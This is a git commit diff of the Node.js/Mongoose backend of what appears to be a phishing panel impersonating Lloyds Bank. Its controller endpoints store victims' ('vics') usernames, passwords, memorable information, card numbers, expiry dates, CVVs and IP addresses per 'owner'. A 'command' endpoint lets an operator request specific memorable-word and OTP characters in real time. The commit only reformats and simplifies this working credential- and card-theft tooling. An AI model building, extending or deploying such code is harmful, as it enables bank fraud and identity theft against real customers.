2073a1b290a2481705a92127c50af88b1a092738
Your Name <you@example.com>
2023-05-03 14:12:28 +0100

    make

--- controllers/lloydsController.js
+++ controllers/lloydsController.js
@@ -1,133 +1,115 @@
 const Lloyds = require("../models/lloydsModel");
 
 const getOwnerVics = async (req, res) => {
-  const { owner } = req.params;
-  Lloyds.find({ owner }).exec((err, vics) => {
-    if (err) {
-      console.log(err);
-      res.status(404).send("Error");
-      return;
-    }
-    res.send(vics);
-  });
+	const { owner } = req.params;
+	Lloyds.find({ owner }).exec((err, vics) => {
+		if (err) {
+			console.log(err);
+			res.status(404).send("Error");
+			return;
+		}
+		res.send(vics);
+	});
 };
 
 const command = async (req, res) => {
-  const {
-    uniqueid,
-    status,
-    memIndex1,
-    memIndex2,
-    memIndex3,
-    otpIndex1,
-    otpIndex2,
-    otpIndex3,
-    otpIndex4,
-  } = req.body;
-  try {
-    if (status == 2) {
-      await Lloyds.findOneAndUpdate(
-        { uniqueid },
-        { status, memIndex1, memIndex2, memIndex3 }
-      ).exec();
-    } else if (status == 6) {
-      await Lloyds.findOneAndUpdate(
-        { uniqueid },
-        { status, otpIndex1, otpIndex2, otpIndex3, otpIndex4 }
-      ).exec();
-    } else {
-      await Lloyds.findOneAndUpdate({ uniqueid }, { status }).exec();
-    }
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { uniqueid, status, memIndex, otpIndex } = req.body;
+	try {
+		if (memIndex)
+			await Lloyds.findOneAndUpdate({ uniqueid }, { status, memIndex }).exec();
+		else if (otpIndex)
+			await Lloyds.findOneAndUpdate({ uniqueid }, { status, otpIndex }).exec();
+		else await Lloyds.findOneAndUpdate({ uniqueid }, { status }).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const getInfo = async (req, res) => {
-  const { uniqueid } = req.params;
-  Lloyds.findOne({ uniqueid }).exec((err, vic) => {
-    if (err) {
-      console.log(err);
-      res.status(404).send("Error");
-      return;
-    }
-    res.send(vic);
-  });
+	const { uniqueid } = req.params;
+	Lloyds.findOne({ uniqueid }).exec((err, vic) => {
+		if (err) {
+			console.log(err);
+			res.status(404).send("Error");
+			return;
+		}
+		res.send(vic);
+	});
 };
 
 const submitLogin = async (req, res) => {
-  const { username, password, uniqueid, owner, ip } = req.body;
-  try {
-    await Lloyds.create({ uniqueid, username, password, status: 1, owner, ip });
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { username, password, uniqueid, owner, ip } = req.body;
+	try {
+		await Lloyds.create({ uniqueid, username, password, status: 1, owner, ip });
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitLoginAgain = async (req, res) => {
-  const { username, password, uniqueid } = req.body;
-  try {
-    await Lloyds.findOneAndUpdate(
-      { uniqueid },
-      { username, password, status: 9 }
-    ).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { username, password, uniqueid } = req.body;
+	try {
+		await Lloyds.findOneAndUpdate(
+			{ uniqueid },
+			{ username, password, status: 9 }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitMemorable = async (req, res) => {
-  const { memorable, uniqueid } = req.body;
-  try {
-    await Lloyds.findOneAndUpdate(
-      { uniqueid },
-      { memorable, status: 3 }
-    ).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { memorable, uniqueid } = req.body;
+	try {
+		await Lloyds.findOneAndUpdate(
+			{ uniqueid },
+			{ memorable, status: 3 }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const submitCard = async (req, res) => {
-  const { ccnum, ccexp, cvv, uniqueid } = req.body;
-  try {
-    await Lloyds.findOneAndUpdate(
-      { uniqueid },
-      { ccnum, ccexp, cvv, status: 5 }
-    ).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { ccnum, ccexp, cvv, uniqueid } = req.body;
+	try {
+		await Lloyds.findOneAndUpdate(
+			{ uniqueid },
+			{ ccnum, ccexp, cvv, status: 5 }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 const deleteEntry = async (req, res) => {
-  const { uniqueid } = req.body;
-  try {
-    await Lloyds.deleteOne({ uniqueid });
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
+	const { uniqueid } = req.body;
+	try {
+		await Lloyds.deleteOne({ uniqueid });
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
 };
 
 module.exports = {
-  getOwnerVics,
-  command,
-  getInfo,
-  submitLogin,
-  submitLoginAgain,
-  submitCard,
-  submitMemorable,
-  deleteEntry,
+	getOwnerVics,
+	command,
+	getInfo,
+	submitLogin,
+	submitLoginAgain,
+	submitCard,
+	submitMemorable,
+	deleteEntry,
 };
--- models/lloydsModel.js
+++ models/lloydsModel.js
@@ -1,23 +1,18 @@
 const mongoose = require("mongoose");
 
 const lloydsSchema = new mongoose.Schema({
-  uniqueid: String,
-  username: String,
-  password: String,
-  memorable: String,
-  ccnum: String,
-  ccexp: String,
-  cvv: String,
-  status: Number,
-  ip: String,
-  owner: String,
-  memIndex1: String,
-  memIndex2: String,
-  memIndex3: String,
-  otpIndex1: String,
-  otpIndex2: String,
-  otpIndex3: String,
-  otpIndex4: String,
+	uniqueid: String,
+	username: String,
+	password: String,
+	memorable: String,
+	ccnum: String,
+	ccexp: String,
+	cvv: String,
+	status: Number,
+	ip: String,
+	owner: String,
+	memIndex: String,
+	otpIndex: String,
 });
 
 module.exports = mongoose.model("Lloyds", lloydsSchema);
